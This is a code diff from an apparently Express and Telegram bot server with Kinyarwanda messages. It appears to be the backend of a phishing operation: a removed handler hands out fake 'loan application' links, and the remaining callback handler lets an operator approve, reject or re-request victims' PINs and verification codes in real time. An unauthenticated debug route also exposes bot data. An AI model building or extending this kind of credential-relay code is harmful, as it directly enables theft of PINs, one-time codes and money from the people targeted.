@@ -135,92 +135,28 @@ app.get('/check-code/:requestId', (req, res) => {
 });
 
 // ---------------- TELEGRAM WEBHOOK ----------------
-const crypto = require("crypto");
-
-app.post("/telegram-webhook/:botId", async (req, res) => {
+app.post('/telegram-webhook/:botId', async (req, res) => {
     const bot = getBot(req.params.botId);
     if (!bot) return res.sendStatus(404);
 
-    const update = req.body;
-
-    // Handle /start
-    if (update.message && update.message.text === "/start") {
-        const chatId = update.message.chat.id;
-
-        // Create a unique token
-        const token = crypto.randomUUID();
-
-        // Save token -> bot/chat mapping
-        loanLinks[token] = {
-            botId: req.params.botId,
-            chatId,
-            createdAt: Date.now()
-        };
-
-        // Your website URL
-        const loanLink = `${process.env.APP_URL}/loan?token=${token}`;
-
-        await sendTelegramMessage(
-            bot,
-            `🎉 Murakaza neza!
-
-📝 Dore link yawe yo gusaba inguzanyo:
-
-${loanLink}
-
-Iyo usabye inguzanyo ukoresheje iyi link, amakuru yose azoherezwa kuri Telegram yawe.`
-        );
-
-        return res.sendStatus(200);
-    }
-
-    // Handle callback buttons
-    const cb = update.callback_query;
+    const cb = req.body.callback_query;
     if (!cb) return res.sendStatus(200);
 
-    const [action, requestId] = cb.data.split(":");
-    let feedback = "";
+    const [action, requestId] = cb.data.split(':');
+    let feedback = '';
 
-    switch (action) {
-        case "pin_ok":
-            approvedPins[requestId] = true;
-            feedback = "PIN yemewe ✅";
-            break;
+    if (action === 'pin_ok') { approvedPins[requestId] = true; feedback = 'PIN yemewe ✅'; }
+    if (action === 'pin_bad') { approvedPins[requestId] = false; feedback = 'PIN yanzwe ❌'; }
+    if (action === 'pin_block') { blockPins[requestId] = true; feedback = 'Umukoresha yahagaritswe 🛑'; }
+    if (action === 'code_ok') { approvedCodes[requestId] = true; feedback = 'Kode yemewe ✅'; }
+    if (action === 'code_bad') { approvedCodes[requestId] = false; feedback = 'Kode yanzwe ❌'; }
+    if (action === 'code_pin') { approvedCodes[requestId] = true; approvedPins[requestId] = false; feedback = 'Kode yemewe – Ongera ushyire PIN'; }
 
-        case "pin_bad":
-            approvedPins[requestId] = false;
-            feedback = "PIN yanzwe ❌";
-            break;
-
-        case "pin_block":
-            blockPins[requestId] = true;
-            feedback = "Umukoresha yahagaritswe 🛑";
-            break;
-
-        case "code_ok":
-            approvedCodes[requestId] = true;
-            feedback = "Kode yemewe ✅";
-            break;
-
-        case "code_bad":
-            approvedCodes[requestId] = false;
-            feedback = "Kode yanzwe ❌";
-            break;
-
-        case "code_pin":
-            approvedCodes[requestId] = true;
-            approvedPins[requestId] = false;
-            feedback = "Kode yemewe – Ongera ushyire PIN";
-            break;
-    }
-
-    if (feedback) {
-        await sendTelegramMessage(bot, `📝 Igisubizo:\n${feedback}`);
-    }
-
+    if (feedback) await sendTelegramMessage(bot, `📝 Igisubizo:\n${feedback}`);
     await answerCallback(bot, cb.id);
-    return res.sendStatus(200);
+    res.sendStatus(200);
 });
+
 // ---------------- GUSUZUMA ----------------
 app.get('/debug/bots', (req, res) => res.json(bots));
 
